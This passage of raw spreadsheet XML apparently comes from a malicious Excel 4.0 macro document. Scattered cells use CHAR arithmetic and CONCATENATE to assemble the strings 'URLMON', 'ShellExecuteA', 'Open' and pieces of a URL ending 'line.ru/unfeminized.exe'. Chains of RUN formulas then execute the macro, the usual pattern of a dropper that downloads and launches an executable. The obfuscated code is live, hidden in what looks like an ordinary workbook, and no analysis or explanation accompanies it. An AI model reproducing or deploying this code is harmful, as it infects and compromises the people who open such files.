      <c r="ET726">
        <v>20</v>
      </c>
      <c r="GF726">
        <v>24</v>
      </c>
    </row>
    <row r="733" spans="75:216" x14ac:dyDescent="0.25">
      <c r="HH733">
        <v>621</v>
      </c>
    </row>
    <row r="738" spans="3:236" x14ac:dyDescent="0.25">
      <c r="DQ738" t="b">
        <f>RUN($GJ$1558)</f>
        <v>0</v>
      </c>
    </row>
    <row r="739" spans="3:236" x14ac:dyDescent="0.25">
      <c r="AB739">
        <v>46</v>
      </c>
    </row>
    <row r="740" spans="3:236" x14ac:dyDescent="0.25">
      <c r="EB740">
        <v>44</v>
      </c>
    </row>
    <row r="742" spans="3:236" x14ac:dyDescent="0.25">
      <c r="BJ742" t="str">
        <f>CHAR($BL$1442-563)</f>
        <v>i</v>
      </c>
    </row>
    <row r="744" spans="3:236" x14ac:dyDescent="0.25">
      <c r="GR744" t="b">
        <f>RUN($CG$995)</f>
        <v>0</v>
      </c>
      <c r="IB744">
        <v>4</v>
      </c>
    </row>
    <row r="745" spans="3:236" x14ac:dyDescent="0.25">
      <c r="Q745" t="str">
        <f>CHAR($FL$1186-14)</f>
        <v>u</v>
      </c>
      <c r="GW745">
        <v>15</v>
      </c>
    </row>
    <row r="748" spans="3:236" x14ac:dyDescent="0.25">
      <c r="C748" t="str">
        <f>CHAR($FE$1252-58)</f>
        <v>a</v>
      </c>
    </row>
    <row r="749" spans="3:236" x14ac:dyDescent="0.25">
      <c r="AI749" t="str">
        <f>CHAR($GM$1297-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="753" spans="43:43" x14ac:dyDescent="0.25">
      <c r="AQ753" t="str">
        <f>CHAR($DS$1734-563)</f>
        <v>e</v>
      </c>
    </row>
    <row r="770" spans="26:225" x14ac:dyDescent="0.25">
      <c r="FH770" t="str">
        <f>CHAR($CC$491-14)</f>
        <v>o</v>
      </c>
    </row>
    <row r="771" spans="26:225" x14ac:dyDescent="0.25">
      <c r="CB771" t="b">
        <f>RUN($E$1059)</f>
        <v>0</v>
      </c>
      <c r="GA771">
        <v>159</v>
      </c>
    </row>
    <row r="772" spans="26:225" x14ac:dyDescent="0.25">
      <c r="CW772">
        <v>97</v>
      </c>
    </row>
    <row r="773" spans="26:225" x14ac:dyDescent="0.25">
      <c r="BF773">
        <v>33</v>
      </c>
    </row>
    <row r="783" spans="26:225" x14ac:dyDescent="0.25">
      <c r="Z783" t="str">
        <f>CHAR($EO$1903-563)</f>
        <v>n</v>
      </c>
      <c r="DE783" t="str">
        <f>CHAR($HV$1378-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="784" spans="26:225" x14ac:dyDescent="0.25">
      <c r="HQ784" t="str">
        <f>CHAR($FZ$826-563)</f>
        <v>f</v>
      </c>
    </row>
    <row r="790" spans="11:242" x14ac:dyDescent="0.25">
      <c r="GV790">
        <v>3</v>
      </c>
      <c r="IH790">
        <v>49</v>
      </c>
    </row>
    <row r="791" spans="11:242" x14ac:dyDescent="0.25">
      <c r="K791">
        <v>29</v>
      </c>
    </row>
    <row r="796" spans="11:242" x14ac:dyDescent="0.25">
      <c r="GK796" t="str">
        <f>CHAR($EQ$102-933)</f>
        <v>M</v>
      </c>
    </row>
    <row r="800" spans="11:242" x14ac:dyDescent="0.25">
      <c r="HS800" t="str">
        <f>CHAR($FT$152-14)</f>
        <v>T</v>
      </c>
    </row>
    <row r="803" spans="15:188" x14ac:dyDescent="0.25">
      <c r="GF803">
        <v>8</v>
      </c>
    </row>
    <row r="804" spans="15:188" x14ac:dyDescent="0.25">
      <c r="FM804">
        <v>32</v>
      </c>
    </row>
    <row r="807" spans="15:188" x14ac:dyDescent="0.25">
      <c r="CT807" t="b">
        <f>RUN($E$576)</f>
        <v>0</v>
      </c>
    </row>
    <row r="808" spans="15:188" x14ac:dyDescent="0.25">
      <c r="O808" t="str">
        <f>CHAR($DO$1752-563)</f>
        <v>n</v>
      </c>
      <c r="CG808">
        <v>77</v>
      </c>
    </row>
    <row r="812" spans="15:188" x14ac:dyDescent="0.25">
      <c r="EC812" t="str">
        <f>CONCATENATE($CY$1588,$EU$1415,$Z$783,$FD$1417,$FJ$1675,$IN$872,$AV$39,$D$984,$GZ$315,$V$1904,$HQ$784,$AQ$753,$HU$1922,$AD$1909,$K$639,$BJ$742,$EO$39,$DY$1822,$EO$1532,$HX$365,$EY$1373,$HG$886,$GH$1708)</f>
        <v>line.ru/unfeminized.exe</v>
      </c>
    </row>
    <row r="818" spans="45:185" x14ac:dyDescent="0.25">
      <c r="AW818" t="str">
        <f>CONCATENATE($DF$1947,$IJ$563,$EN$499,$GK$796,$DX$915,$AX$631)</f>
        <v>URLMON</v>
      </c>
    </row>
    <row r="820" spans="45:185" x14ac:dyDescent="0.25">
      <c r="AS820" t="str">
        <f>CHAR($BR$1822-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="825" spans="45:185" x14ac:dyDescent="0.25">
      <c r="CG825" t="str">
        <f>CHAR($EC$1748-933)</f>
        <v>K</v>
      </c>
    </row>
    <row r="826" spans="45:185" x14ac:dyDescent="0.25">
      <c r="FZ826">
        <v>665</v>
      </c>
    </row>
    <row r="828" spans="45:185" x14ac:dyDescent="0.25">
      <c r="CN828" t="b">
        <f>RUN($DZ$1527)</f>
        <v>0</v>
      </c>
    </row>
    <row r="829" spans="45:185" x14ac:dyDescent="0.25">
      <c r="GC829" t="b">
        <f>RUN($EI$930)</f>
        <v>0</v>
      </c>
    </row>
    <row r="833" spans="7:211" x14ac:dyDescent="0.25">
      <c r="AD833" t="b">
        <f>RUN($FG$1883)</f>
        <v>0</v>
      </c>
    </row>
    <row r="835" spans="7:211" x14ac:dyDescent="0.25">
      <c r="G835">
        <v>20</v>
      </c>
      <c r="ES835" t="b">
        <f>RUN($DW$101)</f>
        <v>0</v>
      </c>
    </row>
    <row r="840" spans="7:211" x14ac:dyDescent="0.25">
      <c r="BC840">
        <v>115</v>
      </c>
    </row>
    <row r="844" spans="7:211" x14ac:dyDescent="0.25">
      <c r="AE844">
        <v>125</v>
      </c>
      <c r="HC844" t="b">
        <f>RUN($N$1402)</f>
        <v>0</v>
      </c>
    </row>
    <row r="851" spans="94:249" x14ac:dyDescent="0.25">
      <c r="HG851" t="b">
        <f>RUN($FY$213)</f>
        <v>0</v>
      </c>
    </row>
    <row r="856" spans="94:249" x14ac:dyDescent="0.25">
      <c r="GL856" t="str">
        <f>CHAR($IF$1880-563)</f>
        <v>k</v>
      </c>
      <c r="IN856" t="b">
        <f>RUN($B$569)</f>
        <v>0</v>
      </c>
    </row>
    <row r="859" spans="94:249" x14ac:dyDescent="0.25">
      <c r="IO859">
        <v>27</v>
      </c>
    </row>
    <row r="861" spans="94:249" x14ac:dyDescent="0.25">
      <c r="CP861">
        <v>620</v>
      </c>
    </row>
    <row r="866" spans="18:248" x14ac:dyDescent="0.25">
      <c r="BD866" t="b">
        <f>RUN($BX$1206)</f>
        <v>0</v>
      </c>
      <c r="GK866">
        <v>51</v>
      </c>
    </row>
    <row r="867" spans="18:248" x14ac:dyDescent="0.25">
      <c r="EW867" t="b">
        <f>RUN($AU$1803)</f>
        <v>0</v>
      </c>
    </row>
    <row r="868" spans="18:248" x14ac:dyDescent="0.25">
      <c r="HU868" t="b">
        <f>RUN($BQ$1926)</f>
        <v>0</v>
      </c>
    </row>
    <row r="872" spans="18:248" x14ac:dyDescent="0.25">
      <c r="DZ872">
        <v>66</v>
      </c>
      <c r="IN872" t="str">
        <f>CHAR($HO$1992-563)</f>
        <v>r</v>
      </c>
    </row>
    <row r="878" spans="18:248" x14ac:dyDescent="0.25">
      <c r="R878" t="b">
        <f>RUN($CN$828)</f>
        <v>0</v>
      </c>
    </row>
    <row r="879" spans="18:248" x14ac:dyDescent="0.25">
      <c r="EN879">
        <v>1041</v>
      </c>
    </row>
    <row r="883" spans="25:240" x14ac:dyDescent="0.25">
      <c r="DH883">
        <v>22</v>
      </c>
      <c r="IF883">
        <v>14</v>
      </c>
    </row>
    <row r="884" spans="25:240" x14ac:dyDescent="0.25">
      <c r="CH884">
        <v>38</v>
      </c>
    </row>
    <row r="886" spans="25:240" x14ac:dyDescent="0.25">
      <c r="HG886" t="str">
        <f>CHAR($IG$1093-563)</f>
        <v>x</v>
      </c>
    </row>
    <row r="887" spans="25:240" x14ac:dyDescent="0.25">
      <c r="AX887" t="b">
        <f>RUN($CA$189)</f>
        <v>0</v>
      </c>
      <c r="EG887">
        <v>64</v>
      </c>
    </row>
    <row r="889" spans="25:240" x14ac:dyDescent="0.25">
      <c r="HR889" t="str">
        <f>CHAR($DR$564-563)</f>
        <v>m</v>
      </c>
    </row>
    <row r="893" spans="25:240" x14ac:dyDescent="0.25">
      <c r="Y893">
        <v>12</v>
      </c>
    </row>
    <row r="896" spans="25:240" x14ac:dyDescent="0.25">
      <c r="FH896">
        <v>55</v>
      </c>
    </row>
    <row r="900" spans="71:151" x14ac:dyDescent="0.25">
      <c r="DK900">
        <v>97</v>
      </c>
    </row>
    <row r="902" spans="71:151" x14ac:dyDescent="0.25">
      <c r="BT902">
        <v>126</v>
      </c>
    </row>
    <row r="905" spans="71:151" x14ac:dyDescent="0.25">
      <c r="BS905">
        <v>60</v>
      </c>
    </row>
    <row r="911" spans="71:151" x14ac:dyDescent="0.25">
      <c r="EU911">
        <v>675</v>
      </c>
    </row>
    <row r="915" spans="39:179" x14ac:dyDescent="0.25">
      <c r="DX915" t="str">
        <f>CHAR($GP$639-933)</f>
        <v>O</v>
      </c>
    </row>
    <row r="917" spans="39:179" x14ac:dyDescent="0.25">
      <c r="EY917" t="str">
        <f>CHAR($GU$53-14)</f>
        <v>n</v>
      </c>
    </row>
    <row r="918" spans="39:179" x14ac:dyDescent="0.25">
      <c r="AR918">
        <v>49</v>
      </c>
    </row>
    <row r="920" spans="39:179" x14ac:dyDescent="0.25">
      <c r="FW920" t="str">
        <f>CHAR($GF$1176-563)</f>
        <v>7</v>
      </c>
    </row>
    <row r="921" spans="39:179" x14ac:dyDescent="0.25">
      <c r="CH921" t="str">
        <f>CHAR($HA$1259-14)</f>
        <v>O</v>
      </c>
    </row>
    <row r="925" spans="39:179" x14ac:dyDescent="0.25">
      <c r="ES925" t="b">
        <f>RUN($CB$1001)</f>
        <v>0</v>
      </c>
    </row>
    <row r="927" spans="39:179" x14ac:dyDescent="0.25">
      <c r="AM927">
        <v>99</v>
      </c>
    </row>
    <row r="930" spans="23:208" x14ac:dyDescent="0.25">
      <c r="EI930" t="b">
        <f>RUN($CZ$564)</f>
        <v>0</v>
      </c>
    </row>
    <row r="939" spans="23:208" x14ac:dyDescent="0.25">
      <c r="GZ939" t="b">
        <f>RUN($GC$958)</f>
        <v>0</v>
      </c>
    </row>
    <row r="942" spans="23:208" x14ac:dyDescent="0.25">
      <c r="W942">
        <v>128</v>
      </c>
    </row>
    <row r="947" spans="74:212" x14ac:dyDescent="0.25">
      <c r="GT947">
        <v>983</v>
      </c>
    </row>
    <row r="949" spans="74:212" x14ac:dyDescent="0.25">
      <c r="EQ949" t="str">
        <f>CHAR($FP$1645-14)</f>
        <v>y</v>
      </c>
    </row>
    <row r="950" spans="74:212" x14ac:dyDescent="0.25">
      <c r="DV950">
        <v>7</v>
      </c>
    </row>
    <row r="953" spans="74:212" x14ac:dyDescent="0.25">
      <c r="FA953" t="str">
        <f>CHAR($EQ$278-14)</f>
        <v>w</v>
      </c>
    </row>
    <row r="955" spans="74:212" x14ac:dyDescent="0.25">
      <c r="BV955" t="b">
        <f>RUN($HC$844)</f>
        <v>0</v>
      </c>
    </row>
    <row r="956" spans="74:212" x14ac:dyDescent="0.25">
      <c r="DC956" t="str">
        <f>CHAR($Z$1119-933)</f>
        <v>e</v>
      </c>
    </row>
    <row r="957" spans="74:212" x14ac:dyDescent="0.25">
      <c r="HD957">
        <v>44</v>
      </c>
    </row>
    <row r="958" spans="74:212" x14ac:dyDescent="0.25">
      <c r="GC958" t="b">
        <f>RUN($DX$1831)</f>
        <v>0</v>
      </c>
    </row>
    <row r="960" spans="74:212" x14ac:dyDescent="0.25">
      <c r="FF960" t="str">
        <f>CHAR($BO$1958-563)</f>
        <v>c</v>
      </c>
    </row>
    <row r="973" spans="71:248" x14ac:dyDescent="0.25">
      <c r="BS973">
        <v>98</v>
      </c>
      <c r="IN973">
        <v>28</v>
      </c>
    </row>
    <row r="981" spans="4:154" x14ac:dyDescent="0.25">
      <c r="AF981">
        <v>42</v>
      </c>
    </row>
    <row r="983" spans="4:154" x14ac:dyDescent="0.25">
      <c r="DT983">
        <v>56</v>
      </c>
    </row>
    <row r="984" spans="4:154" x14ac:dyDescent="0.25">
      <c r="D984" t="str">
        <f>CHAR($AT$484-563)</f>
        <v>/</v>
      </c>
    </row>
    <row r="986" spans="4:154" x14ac:dyDescent="0.25">
      <c r="DE986">
        <v>71</v>
      </c>
    </row>
    <row r="987" spans="4:154" x14ac:dyDescent="0.25">
      <c r="EX987">
        <v>81</v>
      </c>
    </row>
    <row r="989" spans="4:154" x14ac:dyDescent="0.25">
      <c r="DR989">
        <v>4</v>
      </c>
    </row>
    <row r="995" spans="80:145" x14ac:dyDescent="0.25">
      <c r="CG995" t="b">
        <f>RUN($FE$341)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1001" spans="80:145" x14ac:dyDescent="0.25">
      <c r="CB1001" t="b">
        <f>RUN($DX$1827)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1002" spans="80:145" x14ac:dyDescent="0.25">
      <c r="ED1002">
        <v>16</v>
      </c>
    </row>
    <row r="1005" spans="80:145" x14ac:dyDescent="0.25">
      <c r="EO1005">
        <v>9</v>
      </c>
    </row>
    <row r="1006" spans="80:145" x14ac:dyDescent="0.25">
      <c r="CB1006">
        <v>174</v>
      </c>
    </row>
    <row r="1011" spans="41:219" x14ac:dyDescent="0.25">
      <c r="AO1011" t="str">
        <f>CHAR($DS$1957-933)</f>
        <v>e</v>
      </c>
      <c r="BO1011" t="str">
        <f>CHAR($AL$1161-563)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1016" spans="41:219" x14ac:dyDescent="0.25">
      <c r="GH1016" t="str">
        <f>CONCATENATE($FX$1022,$IB$455,$BQ$1896,$HN$124,$HE$1016,$IH$1637,$FY$1823,$BO$1011,$C$1613,$EW$1623,$HB$347,$HN$1083,$FF$960,$HQ$364,$FW$920,$HR$889,$HH$36,$GL$856,$GU$612,$EY$1984,$AN$242,$FT$1370,$CU$1873,$BR$516,$BU$1052,$EB$1509,$HP$1903,$CR$1094,$O$808)</f>
        <v>http://invoice7mukszq9nbpa7on</v>
      </c>
      <c r="HE1016" t="str">
        <f>CHAR($HH$733-563)</f>
        <v>:</v>
      </c>
    </row>
    <row r="1017" spans="41:219" x14ac:dyDescent="0.25">
      <c r="FA1017">
        <v>664</v>
      </c>
    </row>
    <row r="1021" spans="41:219" x14ac:dyDescent="0.25">
      <c r="GJ1021" t="str">
        <f>CONCATENATE($CH$921,$FP$1478,$DX$1593,$EU$330)</f>
        <v>Open</v>
      </c>
    </row>
    <row r="1022" spans="41:219" x14ac:dyDescent="0.25">
      <c r="FX1022" t="str">
        <f>CHAR($DE$1998-563)</f>
        <v>h</v>
      </c>
      <c r="HK1022" t="str">
        <f>CHAR($AE$844-14)</f>
        <v>o</v>
      </c>
    </row>
    <row r="1023" spans="41:219" x14ac:dyDescent="0.25">
      <c r="GF1023">
        <v>33</v>
      </c>
    </row>
    <row r="1027" spans="2:209" x14ac:dyDescent="0.25">
      <c r="BO1027">
        <v>89</v>
      </c>
    </row>
    <row r="1030" spans="2:209" x14ac:dyDescent="0.25">
      <c r="GD1030">
        <v>47</v>
      </c>
      <c r="HA1030">
        <v>99</v>
      </c>
    </row>
    <row r="1032" spans="2:209" x14ac:dyDescent="0.25">
      <c r="BR1032" t="b">
        <f>RUN($ES$835)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1037" spans="2:209" x14ac:dyDescent="0.25">
      <c r="T1037">
        <v>49</v>
      </c>
    </row>
    <row r="1039" spans="2:209" x14ac:dyDescent="0.25">
      <c r="B1039">
        <v>679</v>
      </c>
      <c r="O1039">
        <v>113</v>
      </c>
    </row>
    <row r="1040" spans="2:209" x14ac:dyDescent="0.25">
      <c r="GA1040">
        <v>664</v>
      </c>
    </row>
    <row r="1043" spans="32:222" x14ac:dyDescent="0.25">
      <c r="DK1043">
        <v>61</v>
      </c>
    </row>
    <row r="1048" spans="32:222" x14ac:dyDescent="0.25">
      <c r="GW1048" t="str">
        <f>CHAR($EB$1661-14)</f>
        <v>h</v>
      </c>
    </row>
    <row r="1050" spans="32:222" x14ac:dyDescent="0.25">
      <c r="HN1050">
        <v>67</v>
      </c>
    </row>
    <row r="1051" spans="32:222" x14ac:dyDescent="0.25">
      <c r="AF1051">
        <v>75</v>
      </c>
    </row>
    <row r="1052" spans="32:222" x14ac:dyDescent="0.25">
      <c r="BU1052" t="str">
        <f>CHAR($EU$911-563)</f>
        <v>p</v>
      </c>
    </row>
    <row r="1056" spans="32:222" x14ac:dyDescent="0.25">
      <c r="EI1056">
        <v>52</v>
      </c>
    </row>
    <row r="1057" spans="5:237" x14ac:dyDescent="0.25">
      <c r="FL1057" t="b">
        <f>RUN($GR$744)</f>
        <v>0</v>
      </c>
      <c r="IB1057" t="str">
        <f>CHAR($GM$1489-14)</f>
        <v>c</v>
      </c>
    </row>
    <row r="1058" spans="5:237" x14ac:dyDescent="0.25">
      <c r="AF1058">
        <v>678</v>
      </c>
    </row>
    <row r="1059" spans="5:237" x14ac:dyDescent="0.25">
      <c r="E1059" t="b">
        <f>RUN($EA$1652)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1060" spans="5:237" x14ac:dyDescent="0.25">
      <c r="HF1060">
        <v>125</v>
      </c>
      <c r="IC1060">
        <v>14</v>
      </c>
    </row>
    <row r="1068" spans="5:237" x14ac:dyDescent="0.25">
      <c r="DT1068" t="b">
        <f>RUN($DD$1920)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1070" spans="5:237" x14ac:dyDescent="0.25">
      <c r="IB1070">
        <v>674</v>
      </c>
    </row>
    <row r="1071" spans="5:237" x14ac:dyDescent="0.25">
      <c r="FP1071" t="b">
        <f>RUN($FN$377)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1077" spans="54:222" x14ac:dyDescent="0.25">
      <c r="BB1077" t="str">
        <f>CHAR($HA$1030-14)</f>
        <v>U</v>
      </c>
      <c r="FR1077">
        <v>30</v>
      </c>
    </row>
    <row r="1078" spans="54:222" x14ac:dyDescent="0.25">
      <c r="BB1078" t="b">
        <f>RUN($GU$500)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1083" spans="54:222" x14ac:dyDescent="0.25">
      <c r="HN1083" t="str">
        <f>CHAR($AQ$1686-563)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1088" spans="54:222" x14ac:dyDescent="0.25">
      <c r="DF1088" t="b">
        <f>RUN($X$1555)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1093" spans="84:241" x14ac:dyDescent="0.25">
      <c r="IG1093">
        <v>683</v>
      </c>
    </row>
    <row r="1094" spans="84:241" x14ac:dyDescent="0.25">
      <c r="CR1094" t="str">
        <f>CHAR($FO$325-563)</f>
        <v>o</v>
      </c>
    </row>
    <row r="1095" spans="84:241" x14ac:dyDescent="0.25">
      <c r="HX1095">
        <v>122</v>
      </c>
    </row>
    <row r="1101" spans="84:241" x14ac:dyDescent="0.25">
      <c r="CF1101" t="b">
        <f>RUN($DF$1088)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1105" spans="26:234" x14ac:dyDescent="0.25">
      <c r="GQ1105" t="b">
        <f>RUN($CT$807)</f>
        <v>0</v>
      </c>
      <c r="HL1105">
        <v>81</v>
      </c>
    </row>
    <row r="1107" spans="26:234" x14ac:dyDescent="0.25">
      <c r="BP1107">
        <v>13</v>
      </c>
    </row>
    <row r="1110" spans="26:234" x14ac:dyDescent="0.25">
      <c r="BK1110" t="b">
        <f>RUN($DF$1175)</f>
        <v>0</v>
      </c>
      <c r="GZ1110">
        <v>68</v>
      </c>
    </row>
    <row r="1114" spans="26:234" x14ac:dyDescent="0.25">
      <c r="HZ1114">
        <v>22</v>
      </c>
    </row>
    <row r="1119" spans="26:234" x14ac:dyDescent="0.25">
      <c r="Z1119">
        <v>1034</v>
      </c>
    </row>
    <row r="1120" spans="26:234" x14ac:dyDescent="0.25">
      <c r="BN1120">
        <v>19</v>
      </c>
    </row>
    <row r="1130" spans="10:216" x14ac:dyDescent="0.25">
      <c r="HH1130">
        <v>12</v>
      </c>
    </row>
    <row r="1135" spans="10:216" x14ac:dyDescent="0.25">
      <c r="DF1135">
        <v>60</v>
      </c>
    </row>
    <row r="1136" spans="10:216" x14ac:dyDescent="0.25">
      <c r="J1136">
        <v>32</v>
      </c>
    </row>
    <row r="1139" spans="40:239" x14ac:dyDescent="0.25">
      <c r="IE1139" t="str">
        <f>CONCATENATE($ER$1278)</f>
        <v>ShellExecuteA</v>
      </c>
    </row>
    <row r="1140" spans="40:239" x14ac:dyDescent="0.25">
      <c r="DY1140">
        <v>116</v>
      </c>
    </row>
    <row r="1141" spans="40:239" x14ac:dyDescent="0.25">
      <c r="AN1141">
        <v>57</v>
      </c>
      <c r="FJ1141" t="str">
        <f>CHAR($GR$1631-933)</f>
        <v>S</v>
      </c>
    </row>
    <row r="1154" spans="38:220" x14ac:dyDescent="0.25">
      <c r="HL1154">
        <v>52</v>
      </c>
    </row>
    <row r="1155" spans="38:220" x14ac:dyDescent="0.25">
      <c r="BX1155">
        <v>93</v>
      </c>
    </row>
    <row r="1157" spans="38:220" x14ac:dyDescent="0.25">
      <c r="HH1157" t="b">
        <f>RUN($BD$1638)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1159" spans="38:220" x14ac:dyDescent="0.25">
      <c r="BA1159" t="b">
        <f>RUN($IE$1918)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1161" spans="38:220" x14ac:dyDescent="0.25">
      <c r="AL1161">
        <v>668</v>
      </c>
    </row>
    <row r="1164" spans="38:220" x14ac:dyDescent="0.25">
      <c r="ED1164">
        <v>128</v>
      </c>
    </row>
    <row r="1165" spans="38:220" x14ac:dyDescent="0.25">
      <c r="EE1165" t="b">
        <f>RUN($AD$833)</f>
        <v>0</v>
      </c>
      <c r="GN1165" t="str">
        <f>CHAR($BM$595-14)</f>
        <v>i</v>
      </c>
    </row>
    <row r="1170" spans="110:188" x14ac:dyDescent="0.25">
      <c r="EL1170">
        <v>165</v>
      </c>
    </row>
    <row r="1173" spans="110:188" x14ac:dyDescent="0.25">
      <c r="FH1173">
        <v>673</v>
      </c>
    </row>
    <row r="1175" spans="110:188" x14ac:dyDescent="0.25">
      <c r="DF1175" t="b">
        <f>RUN($HT$1874)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1176" spans="110:188" x14ac:dyDescent="0.25">
      <c r="GF1176">
        <v>618</v>
      </c>
    </row>
    <row r="1186" spans="157:168" x14ac:dyDescent="0.25">
      <c r="FL1186">
        <v>131</v>
      </c>
    </row>
    <row r="1188" spans="157:168" x14ac:dyDescent="0.25">
      <c r="FE1188">
        <v>134</v>
      </c>
    </row>
    <row r="1199" spans="157:168" x14ac:dyDescent="0.25">
      <c r="FA1199">
        <v>676</v>
      </c>
    </row>
    <row r="1204" spans="76:247" x14ac:dyDescent="0.25">
      <c r="DT1204">
        <v>79</v>
      </c>
      <c r="FF1204" t="b">
        <f>RUN($EZ$1462)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1206" spans="76:247" x14ac:dyDescent="0.25">
      <c r="BX1206" t="b">
        <f>RUN($IE$222)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1207" spans="76:247" x14ac:dyDescent="0.25">
      <c r="IM1207">
        <v>122</v>
      </c>
    </row>
    <row r="1217" spans="97:207" x14ac:dyDescent="0.25">
      <c r="GY1217" t="b">
        <f>RUN($FO$1492)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1218" spans="97:207" x14ac:dyDescent="0.25">
      <c r="GN1218" t="b">
        <f>RUN($FL$1057)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1223" spans="97:207" x14ac:dyDescent="0.25">
      <c r="FC1223">
        <v>33</v>
      </c>
    </row>
    <row r="1227" spans="97:207" x14ac:dyDescent="0.25">
      <c r="CS1227">
        <v>2</v>
      </c>
    </row>
    <row r="1234" spans="31:188" x14ac:dyDescent="0.25">
      <c r="GF1234" t="str">
        <f>CHAR($CB$1006-58)</f>
        <v>t</v>
      </c>
    </row>
    <row r="1235" spans="31:188" x14ac:dyDescent="0.25">
      <c r="AP1235" t="str">
        <f>CHAR($FR$197-58)</f>
        <v>e</v>
      </c>
      <c r="CP1235">
        <v>671</v>
      </c>
    </row>
    <row r="1237" spans="31:188" x14ac:dyDescent="0.25">
      <c r="AE1237" t="str">
        <f>CHAR($GT$947-933)</f>
        <v>2</v>
      </c>
    </row>
    <row r="1241" spans="31:188" x14ac:dyDescent="0.25">
      <c r="AP1241" t="b">
        <f>RUN($FP$1071)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1242" spans="31:188" x14ac:dyDescent="0.25">
      <c r="EE1242">
        <v>172</v>
      </c>
    </row>
    <row r="1243" spans="31:188" x14ac:dyDescent="0.25">
      <c r="BH1243">
        <v>12</v>
      </c>
    </row>
    <row r="1252" spans="97:209" x14ac:dyDescent="0.25">
      <c r="EA1252" t="str">
        <f>CHAR($AS$1825-58)</f>
        <v>o</v>
      </c>
      <c r="FE1252">
        <v>155</v>
      </c>
    </row>
    <row r="1253" spans="97:209" x14ac:dyDescent="0.25">
      <c r="EX1253">
        <v>56</v>
      </c>
    </row>
    <row r="1255" spans="97:209" x14ac:dyDescent="0.25">
      <c r="EJ1255" t="str">
        <f>CHAR($FE$1188-14)</f>
        <v>x</v>
      </c>
    </row>
    <row r="1258" spans="97:209" x14ac:dyDescent="0.25">
      <c r="GC1258" t="str">
        <f>CHAR($DQ$1955-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1259" spans="97:209" x14ac:dyDescent="0.25">
      <c r="HA1259">
        <v>93</v>
      </c>
    </row>
    <row r="1262" spans="97:209" x14ac:dyDescent="0.25">
      <c r="CS1262">
        <v>96</v>
      </c>
    </row>
    <row r="1266" spans="26:148" x14ac:dyDescent="0.25">
      <c r="Z1266">
        <v>75</v>
      </c>
    </row>
    <row r="1270" spans="26:148" x14ac:dyDescent="0.25">
      <c r="CS1270" t="b">
        <f>RUN($BB$664)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1276" spans="26:148" x14ac:dyDescent="0.25">
      <c r="DT1276" t="str">
        <f>CHAR($FT$1382-933)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1278" spans="26:148" x14ac:dyDescent="0.25">
      <c r="CF1278" t="b">
        <f>RUN($R$878)</f>
        <v>0</v>
      </c>
      <c r="ER1278" t="str">
        <f>CONCATENATE($AC$207,$GW$1048,$AS$820,$AB$372,$CT$1363,$ET$1289,$EJ$1255,$DE$783,$IB$1057,$Q$745,$CC$1693,$M$1320,$HH$1869)</f>
        <v>ShellExecuteA</v>
      </c>
    </row>
    <row r="1281" spans="51:225" x14ac:dyDescent="0.25">
      <c r="AY1281">
        <v>21</v>
      </c>
    </row>
    <row r="1284" spans="51:225" x14ac:dyDescent="0.25">
      <c r="HQ1284">
        <v>175</v>
      </c>
    </row>
    <row r="1286" spans="51:225" x14ac:dyDescent="0.25">
      <c r="BT1286" t="b">
        <f>RUN($CH$542)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1289" spans="51:225" x14ac:dyDescent="0.25">
      <c r="ET1289" t="str">
        <f>CHAR($AO$1620-14)</f>
        <v>E</v>
      </c>
    </row>
    <row r="1292" spans="51:225" x14ac:dyDescent="0.25">
      <c r="HD1292">
        <v>59</v>
      </c>
    </row>
    <row r="1297" spans="13:206" x14ac:dyDescent="0.25">
      <c r="GM1297">
        <v>115</v>
      </c>
    </row>
    <row r="1298" spans="13:206" x14ac:dyDescent="0.25">
      <c r="M1298">
        <v>115</v>
      </c>
    </row>
    <row r="1299" spans="13:206" x14ac:dyDescent="0.25">
      <c r="EX1299">
        <v>5</v>
      </c>
    </row>
    <row r="1300" spans="13:206" x14ac:dyDescent="0.25">
      <c r="CB1300">
        <v>99</v>
      </c>
    </row>
    <row r="1305" spans="13:206" x14ac:dyDescent="0.25">
      <c r="O1305">
        <v>74</v>
      </c>
    </row>
    <row r="1307" spans="13:206" x14ac:dyDescent="0.25">
      <c r="AG1307">
        <v>85</v>
      </c>
    </row>
    <row r="1311" spans="13:206" x14ac:dyDescent="0.25">
      <c r="GX1311">
        <v>53</v>
      </c>
    </row>
    <row r="1319" spans="13:172" x14ac:dyDescent="0.25">
      <c r="ET1319">
        <v>6</v>
      </c>
    </row>
    <row r="1320" spans="13:172" x14ac:dyDescent="0.25">
      <c r="M1320" t="str">
        <f>CHAR($ID$408-14)</f>
        <v>e</v>
      </c>
    </row>
    <row r="1321" spans="13:172" x14ac:dyDescent="0.25">
      <c r="FL1321">
        <v>55</v>
      </c>
    </row>
    <row r="1324" spans="13:172" x14ac:dyDescent="0.25">
      <c r="FP1324">
        <v>36</v>
      </c>
    </row>
    <row r="1333" spans="21:171" x14ac:dyDescent="0.25">
      <c r="CQ1333">
        <v>67</v>
      </c>
    </row>
    <row r="1339" spans="21:171" x14ac:dyDescent="0.25">
      <c r="U1339" t="str">
        <f>CHAR($BW$280-933)</f>
        <v>3</v>
      </c>
      <c r="FO1339" t="b">
        <f>RUN($Y$1984)</f>
        <v>0</v>
      </c>
    </row>
    <row r="1340" spans="21:171" x14ac:dyDescent="0.25">
      <c r="EB1340">
        <v>668</v>
      </c>
